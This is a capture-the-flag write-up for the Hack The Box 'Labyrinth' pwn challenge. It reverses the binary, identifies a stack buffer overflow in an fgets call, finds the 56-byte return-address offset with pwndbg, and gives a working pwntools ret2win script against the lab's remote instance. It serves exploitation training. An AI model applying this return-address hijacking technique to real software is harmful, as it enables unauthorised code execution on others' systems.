# HTB Labyrinth - Pwn Challenge

Running the binary we get a labyrinth where we have to choose which door to take.

Trying a few doors we get `[-] YOU FAILED TO ESCAPE!`.

## Reversing

We open the binary in Ghidra and find the `main` function. Analyzing it in Ghidra we can see we are expected to enter door `69` or `069`:
```c
local-18 = (char *)malloc(0x10);
fgets(local-18,5,stdin);
iVar1 = strncmp(local-18,"69",2);
if (iVar1 != 0) {
    iVar1 = strncmp(local-18,"069",3);
    if (iVar1 != 0) goto LAB-004015da;
}
fwrite("\nYou are heading to open the door but you suddenly see something on the wall:\n\n\"Fly like a bird and be free!\"\n\nWould you like to change the door you chose?\n\n>> "
       ,1,0xa0,stdout);
fgets(local-38,0x44,stdin);
LAB-004015da:
fprintf(stdout,"\n%s[-] YOU FAILED TO ESCAPE!\n\n",&DAT-00402541);
return 0;
```

After entering the correct door we get a message asking if we want to change our choice. Regardless of input we always end up at `[-] YOU FAILED TO ESCAPE!`.

## Vulnerability

There is a buffer overflow in the second `fgets` call. It reads up to `0x44` (68) bytes, but `local-38` is only 32 bytes:
```
char local-38 [32];
```

There is also a function called `escape-plan` which prints the flag:
```c
void escape-plan(void)
{
  ssize-t sVar1;
  char local-d;
  int local-c;

  putchar(10);
  fwrite(&DAT-00402018,1,0x1f0,stdout);
  fprintf(stdout,
          "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey : %s\n"
          ,&DAT-0040220e,&DAT-00402209);
  local-c = open("./flag.txt",0);
  if (local-c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n\n");
    exit(1);
  }
  while( true ) {
    sVar1 = read(local-c,&local-d,1);
    if (sVar1 < 1) break;
    fputc((int)local-d,stdout);
  }
  close(local-c);
  return;
}
```

So the goal is to overwrite the return address to point to `escape-plan`.

## Exploit

First, find the offset to the return address using `cyclic` inside pwndbg:
```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Set a breakpoint right before `main` returns, run the program and paste the cyclic pattern as input for the second `fgets`. This will give us the offset.

The offset is **56 bytes**. The address of `escape-plan`:
```
pwndbg> info functions escape-plan
All functions matching regular expression "escape-plan":

Non-debugging symbols:
0x0000000000401255  escape-plan
```

A direct jump to `escape-plan` won't work due to stack misalignment. We prepend a `ret` gadget to fix the 16-byte alignment before calling into `escape-plan`:
```python
from pwn import *

p = remote("154.57.164.65", 31366)
# p = process("./labyrinth")

p.sendlineafter(b"Select door:", b"69")

payload  = b"A" * 56
payload += p64(0x401016)   # ret gadget (stack alignment)
payload += p64(0x401255)   # escape-plan
p.sendlineafter(b">>", payload)

p.interactive()
```

Running the exploit pops the flag.
